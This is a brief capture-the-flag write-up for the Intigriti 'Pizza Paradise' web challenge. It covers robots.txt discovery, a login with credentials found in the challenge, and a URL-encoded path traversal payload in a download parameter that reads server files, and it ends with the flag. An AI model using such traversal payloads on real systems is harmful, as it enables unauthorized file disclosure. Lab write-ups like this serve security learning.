# Pizza Paradise

Solved by: @If-Modified-Since and @Cookies to Sell

## Question:
Something weird going on at this pizza store!!


## Solution:
@If-Modified-Since found the first few steps
1 - view `/robots.txt`
2 - Found https://pizzaparadise.ctf.intigriti.io/secret_172346606e1d24062e891d537e917a90.html
3 - Visit and login using `agent_1337:intel420`

@Cookies found the bypass (url encoding)

```
https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php/?download=%2Fassets%2Fimages%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fvar/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
```
**Flag:** `INTIGRITI{70p_53cr37_m15510n_c0mpl373}`
